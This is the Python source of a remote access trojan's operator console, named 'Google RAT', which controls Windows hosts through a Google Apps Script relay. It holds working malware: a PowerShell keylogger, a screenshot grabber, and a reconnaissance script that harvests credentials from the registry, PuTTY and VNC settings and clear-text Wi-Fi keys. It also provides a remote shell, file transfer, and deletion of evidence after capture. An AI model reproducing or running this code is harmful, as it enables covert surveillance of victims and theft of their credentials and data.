import os
import base64
import logging
import requests
import datetime
import argparse
import subprocess
import multiprocessing.dummy

CMD_ID = '1'
CHUNK_ID = '2'
UPLOAD_ID = '3'
CHUNK_SIZE = 50000 # 50 KB
LOG_FORMAT = '[%(asctime)s][%(levelname)s] %(message)s'
BANNER = """
*******************************************************************************
Google RAT
*******************************************************************************
# view help:
python script.py -h
# connect to server
python script.py https://script.google.com/macros/s/dfjlksdf/exec
*******************************************************************************
"""
class Shell(object):
  BANNER = """
          ___
    . -^   `--,
   /# =========`-_       +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
  /# (--====___====\     |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
 /#   .- --.  . --.|     +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
/##   |  * ) (   * ),                   Author: Mr. Poopybutthole
|##   \    /\ \   / |
|###   ---   \ ---  |
|####      ___)    #|    Type 'help' for a list of commands
|######           ##|
 \##### ---------- /
  \####           (
   `\###          |
     \###         |
      \##        |
       \###.    .)
        `======/
  """
  SCREENSHOT_SCRIPT = r"""
  [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing') | out-null;
  [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | out-null;
  $d = (Get-ItemProperty 'HKCU:\Control Panel\Desktop\WindowMetrics' -Name AppliedDPI).AppliedDPI;
  switch ($d) {
    96  {$d = 100};
    120 {$d = 125};
    144 {$d = 150};
    168 {$d = 175};
    192 {$d = 200};
    216 {$d = 225};
    240 {$d = 250};
    default {$d = 100};
  }
  $s = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize;
  $w = [int][Math]::Floor((($s.width) / 100) * $d);
  $h = [int][Math]::Floor((($s.height) / 100) * $d);
  $b = New-Object System.Drawing.Bitmap($w, $h);
  $g = [System.Drawing.Graphics]::FromImage($b);
  $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),$b.Size);
  $g.Dispose();
  $b.Save('_.jpeg', ([system.drawing.imaging.imageformat]::Jpeg));
  Get-ItemProperty '_.jpeg';
  """
  KEYLOGGER_SCRIPT = r"""
  $i = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);';
  $a = Add-Type -MemberDefinition $i -Name 'Win32' -Namespace API -PassThru;
  $t = new-timespan -Minutes 1;
  $w = [diagnostics.stopwatch]::StartNew();
  $l = New-Object System.Collections.ArrayList;
  while ($w.elapsed -lt $t) {
    Start-Sleep -m 50;
    for ($c = 32; $c -le 126; $c++) {
      if ($a::GetAsyncKeyState($c) -eq -32767) {
        $l.Add([System.Convert]::ToChar($c)) | out-null;
      }
    }
  }
  $l -join '' | out-file '_.txt';
  Get-ItemProperty '_.txt';
  """
  INFO_SCRIPT = r"""
  date;
  whoami;
  ipconfig /all;
  systeminfo;
  get-childitem "\\$env:COMPUTERNAME\c$\Users" | sort-object LastWriteTime -Descending | select-object Name;
  net user;
  net localgroup;
  net localgroup administrators;
  tasklist;
  get-service;
  netstat -ano;
  route print;
  ipconfig /displaydns;
  arp -a;
  netsh wlan show networks;
  net share;
  netsh advfirewall show allprofiles;
  reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run';
  reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce';
  reg query 'HKCU\Software\Microsoft\Internet Explorer';
  reg query 'HKCU\Software\Microsoft\Internet Explorer\Main' /v 'Start Page' /t REG_SZ;
  reg query 'HKCU\Software\Microsoft\Internet Explorer\TypedURLs';
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon";
  reg query "HKCU\Software\ORL\WinVNC3\Password";
  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions";
  reg query HKLM /f password /t REG_SZ /s;
  reg query HKCU /f password /t REG_SZ /s;
  schtasks /query /fo LIST /v;
  netsh wlan export profile key=clear;
  """

  def __init__(self, srv):
    self.srv = srv
    self.hosts = []
    logging.info('connecting to {}'.format(self.srv))
    r = requests.get(args.srv)
    if r.status_code != requests.codes.ok:
      logging.error('server not responding. response: {0}'.format(r.status_code))
    else:
      logging.info('success. server is up!')
    print(self.BANNER)

  def __e(self, d):
    return base64.b64encode(d.encode('UTF-8')).decode('UTF-8')

  def __u(self, ip):
    if ip in [d['ip'] for d in self.hosts]:
      return [d['user'] for d in self.hosts if d['ip'] == ip][0]
    else:
      return ''

  def __r(self, ip, user, d, d_type):
    key = ''.join([user, '@', ip])
    s = ip + '|' + user
    dx = base64.b64encode(d).decode('UTF-8')
    # split data into chunk sizes
    chunks = [dx[i:i + CHUNK_SIZE] for i in range(0, len(dx), CHUNK_SIZE)]
    for i in range(len(chunks)):
      # wait to send data
      logging.info('[{0}] waiting on TxR = 0 ...'.format(key))
      while True:
        r = requests.get(self.srv, params={'TxR': '{0}'.format(self.__e(s))})
        if r.status_code != requests.codes.ok:
          logging.error('[{0}] TxR GET request failed: {1}'.format(key, r.status_code))
          return ''
        logging.debug('[{0}] TxR: {1}'.format(key, r.content.decode('UTF-8')))
        if r.content.decode('UTF-8') == '0':
          break
      # send data
      logging.info('[{0}] sending data chunk {1} of {2} ...'.format(key, i + 1, len(chunks)))
      r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|4'])))}, data={'d': chunks[i]})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] Tx POST request failed: {1}'.format(key, r.status_code))
        return ''
      logging.debug('[{0}] TxD = {1}'.format(key, chunks[i]))
      # set data type
      if i != (len(chunks) - 1):
        tp = CHUNK_ID
      else:
        tp = d_type
      logging.info('[{0}] setting TxR = {1} ...'.format(key, tp))
      r = requests.post(self.srv, params={'Tx': '{0}'.format(self.__e(''.join([s, '|3'])))}, data={'d': tp})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] Tx POST request failed: {1}'.format(key, r.status_code))
        return ''
    # download data in chunks
    data = []
    while True:
      # wait to get data
      logging.info('[{0}] waiting on RxR != 0 ...'.format(key))
      while True:
        r = requests.get(self.srv, params={'RxR': '{0}'.format(self.__e(s))})
        if r.status_code != requests.codes.ok:
          logging.error('[{0}] RxR GET request failed: {1}'.format(key, r.status_code))
          return ''
        logging.debug('[{0}] RxR: {1}'.format(key, r.content.decode('UTF-8')))
        if r.content.decode('UTF-8') != '0':
          break
      tp = r.content.decode('UTF-8')
      # download data
      r = requests.get(self.srv, params={'RxD': '{0}'.format(self.__e(''.join([s, '|4'])))})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] RxD GET request failed: {1}'.format(key, r.status_code))
        return ''
      logging.debug('[{0}] RxD = {1}'.format(key, r.content.decode('UTF-8')))
      data.append(r.content.decode('UTF-8'))
      # ACK download of data
      logging.info('[{0}] setting RxR = 0 ...'.format(key))
      r = requests.post(self.srv, params={'Rx': '{0}'.format(self.__e(''.join([s, '|3'])))}, data={'d': '0'})
      if r.status_code != requests.codes.ok:
        logging.error('[{0}] Rx POST request failed: {1}'.format(key, r.status_code))
        return ''
      # return array of chunked data if done
      if tp != CHUNK_ID:
        logging.info('[{0}] all client data received ...'.format(key))
        break
      logging.info('[{0}] client has more data to send ...'.format(key))
    return data

  def help(self):
    print('ls         - list all active clients')
    print('screenshot - capture screen on <ip> or all')
    print('keylogger  - capture ASCII keystrokes on <ip> or all for 1 minute')
    print('info       - gather system info about <ip> or all')
    print('shell      - run powershell commands on <ip>')
    print('script     - run powershell script on <ip> or all')
    print('upload     - upload local <file> to <ip> or all')
    print('download   - download remote <file> from <ip> or all')
    print('quit       - exit')

  def thread(self, f, ip, d):
    if ip != 'all':
      f({'ip':ip,'args':d})
      return
    # identify targets
    hosts = self.ls()
    # spawn threads for request
    threads = multiprocessing.dummy.Pool(len(hosts))
    r = threads.map(f, [{'ip':h['ip'],'args':d} for h in hosts])
    print('DONE')

  def ls(self):
    r = requests.get(self.srv, params={'ls': ''})
    if r.status_code != requests.codes.ok:
      logging.error('failed to execute "ls" command. response: {0}'.format(r.status_code))
    else:
      hosts = []
      raw = r.content.decode('UTF-8').split('|')
      for last,first,ip,user in zip(raw[0::4], raw[1::4], raw[2::4], raw[3::4]):
        if ip and user:
          hosts.append({'last': last, 'first': first, 'ip': ip, 'user': user})
          print('[{0}] [{1}] {2} | {3}'.format(first, last, ip, user))
      if not hosts:
        logging.info('no hosts found')
      self.hosts = hosts
    return self.hosts

  def run(self, cmd):
    try:
      print(subprocess.check_output(cmd.split(' ')).decode('UTF-8'))
    except:
      logging.error('failed to run command: {0}'.format(cmd))

  def shell(self, d):
    logging.info('enter "quit" to exit shell')
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    while True:
      cmd = input('{0}@{1} PS> '.format(user, d['ip'])).lower()
      if cmd in ['e', 'q', 'exit', 'quit']:
        logging.info('exiting shell on {0}'.format(d['ip']))
        break
      if cmd.strip():
        r = self.__r(d['ip'], user, cmd.encode('UTF-16LE'), CMD_ID)
        print(base64.b64decode(''.join(r)).decode('UTF-8'))

  def script(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    try:
      with open(d['args']['path'], 'r') as f:
        r = self.__r(d['ip'], user, f.read().encode('UTF-16LE'), CMD_ID)
        print(base64.b64decode(''.join(r)).decode('UTF-8'))
    except:
     logging.error('[{0}] failed to run script: {1}'.format(key, d['args']['path']))

  def upload(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    try:
      with open(d['args']['path'], 'rb') as f:
        r = self.__r(d['ip'], user, f.read(), os.path.basename(d['args']['path']))
        print(base64.b64decode(''.join(r)).decode('UTF-8'))
      print('[{0}] SUCCESS - uploaded file {1}'.format(key, d['args']['path']))
    except:
      logging.error('[{0}] failed to send file: {1}'.format(key, d['args']['path']))

  def download(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    try:
      with open(d['args']['dest'], 'wb') as f:
        r = self.__r(d['ip'], user, d['args']['path'].encode('UTF-8'), UPLOAD_ID)
        f.write(base64.b64decode(''.join(r)))
      print('[{0}] SUCCESS - downloaded file {1} as {2}'.format(key, d['args']['path'], d['args']['dest']))
    except:
      logging.error('[{0}] failed to download file {1} as {2}'.format(key, d['args']['path'], d['args']['dest']))

  def screenshot(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    # run script to make screenshot
    logging.info('[{0}] generating screenshot file _.jpeg ...'.format(key))
    try:
      r = self.__r(d['ip'], user, self.SCREENSHOT_SCRIPT.encode('UTF-16LE'), CMD_ID)
      print(base64.b64decode(''.join(r)).decode('UTF-8'))
    except:
      logging.error('[{0}] failed to run screenshot script: {1}'.format(key, self.SCREENSHOT_SCRIPT))
    # download screenshot
    logging.info('[{0}] downloading screenshot file _.jpeg ...'.format(key))
    try:
      self.download({
        'ip': d['ip'],
        'args': {
          'path': '_.jpeg',
          'dest': 'screenshot_{0}_{1}_{2}.jpeg'.format(user, d['ip'], datetime.datetime.now().strftime("%d-%b-%Y-%M:%H")),
        }
      })
    except:
      logging.error('[{0}] failed to download screenshot file: _.jpeg'.format(key))
    # delete screenshot file
    logging.info('[{0}] deleting screenshot file _.jpeg ...'.format(key))
    try:
      r = self.__r(d['ip'], user, 'del _.jpeg'.encode('UTF-16LE'), CMD_ID)
      print(base64.b64decode(''.join(r)).decode('UTF-8'))
    except:
      logging.error('[{0}] failed to delete screenshot file _.jpeg'.format(key))
    print('[{0}] SUCCESS - downloaded file _.jpeg'.format(key))

  def keylogger(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    # run script to make log
    logging.info('[{0}] running keylogger for 1 minute ...'.format(key))
    try:
      r = self.__r(d['ip'], user, self.KEYLOGGER_SCRIPT.encode('UTF-16LE'), CMD_ID)
      print(base64.b64decode(''.join(r)).decode('UTF-8'))
    except:
      logging.error('[{0}] failed to run keylogger script: {1}'.format(key, self.KEYLOGGER_SCRIPT))
    # download log
    logging.info('[{0}] downloading keylogger file _.txt ...'.format(key))
    try:
      self.download({
        'ip': d['ip'],
        'args': {
          'path': '_.txt',
          'dest': 'keylogger_{0}_{1}_{2}.txt'.format(user, d['ip'], datetime.datetime.now().strftime("%d-%b-%Y-%M:%H")),
        }
      })
    except:
      logging.error('[{0}] failed to download keylogger file: _.txt'.format(key))
    # delete keylogger file
    logging.info('[{0}] deleting keylogger file _.txt ...'.format(key))
    try:
      r = self.__r(d['ip'], user, 'del _.txt'.encode('UTF-16LE'), CMD_ID)
      print(base64.b64decode(''.join(r)).decode('UTF-8'))
    except:
      logging.error('[{0}] failed to delete keylogger file _.txt'.format(key))
    print('[{0}] SUCCESS - downloaded file _.txt'.format(key))

  def info(self, d):
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    user = self.__u(d['ip'])
    if not user:
      logging.error('invalid ip: {0}'.format(d['ip']))
      return
    key = ''.join([user, '@', d['ip']])
    # run script to make log
    logging.info('[{0}] gathering info ...'.format(key))
    try:
      r = self.__r(d['ip'], user, self.INFO_SCRIPT.encode('UTF-16LE'), CMD_ID)
      filename = 'info_{0}_{1}_{2}.txt'.format(user, d['ip'], datetime.datetime.now().strftime("%d-%b-%Y-%M:%H"))
      with open(filename, 'w') as f:
        f.write(base64.b64decode(''.join(r)).decode('UTF-8'))
      logging.info('[{0}] data written to {1}'.format(key, filename))
    except:
      logging.error('[{0}] failed to run info script: {0}'.format(key, self.INFO_SCRIPT))

if __name__ == '__main__':
  # parse user arguments
  parser = argparse.ArgumentParser(usage=BANNER)
  parser.add_argument('srv', help='google apps server URL', type=str)
  parser.add_argument('-l', dest='logging_level', default='INFO', help='logging level for output', type=str)
  args = parser.parse_args()
  # setup logger
  logging.basicConfig(format=LOG_FORMAT, datefmt='%d %b %Y %H:%M:%S', level=args.logging_level)
  # create user shell
  sh = Shell(args.srv)
  # accept user input for hosts
  while True:
    c = input('> ').lower()
    if c == 'help':
      sh.help()
    elif c == 'ls':
      sh.ls()
    elif c == 'shell':
      sh.thread(sh.shell, input('ip: '), {})
    elif c == 'info':
      sh.thread(sh.info, input('ip: '), {})
    elif c == 'screenshot':
      sh.thread(sh.screenshot, input('ip: '), {})
    elif c == 'keylogger':
      sh.thread(sh.keylogger, input('ip: '), {})
    elif c == 'script':
      ip = input('ip: ')
      file = input('script path: ')
      sh.thread(sh.script, ip, {'path': file})
    elif c == 'upload':
      ip = input('ip: ')
      file = input('file path: ')
      sh.thread(sh.upload, ip, {'path': file})
    elif c == 'download':
      ip = input('ip: ')
      file = input('file path: ')
      dest = input('destination path: ')
      sh.thread(sh.download, ip, {'path': file, 'dest': dest})
    elif c in ['e', 'q', 'exit', 'quit']:
      break
    else:
      sh.run(c)
